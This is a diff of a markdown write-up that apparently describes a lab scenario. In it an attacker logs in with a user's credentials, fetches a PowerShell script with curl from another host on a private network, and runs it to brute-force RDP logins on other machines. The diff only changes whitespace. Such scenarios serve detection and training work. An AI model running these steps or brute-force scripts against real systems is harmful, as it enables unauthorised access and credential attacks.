@@ -4,6 +4,7 @@
 
 
 # Scenario Summary: 
+
 An Attacker has tried to logged in into the System by using credentials of a user and by that machine,  
 attacker Brute Force other system on the network through RDP using a PowerShell Scripts.  
 
@@ -20,7 +21,8 @@ ssh low@192.168.0.103
 ```
 curl http://192.168.0.106/RDP.ps1
 ```
-2) Then executed the script to Brute Force other system.    
+2) Then executed the script to Brute Force other system.  
+
 [To See the ps1 file ](scripts/RDP.ps1)
 
 *******************************
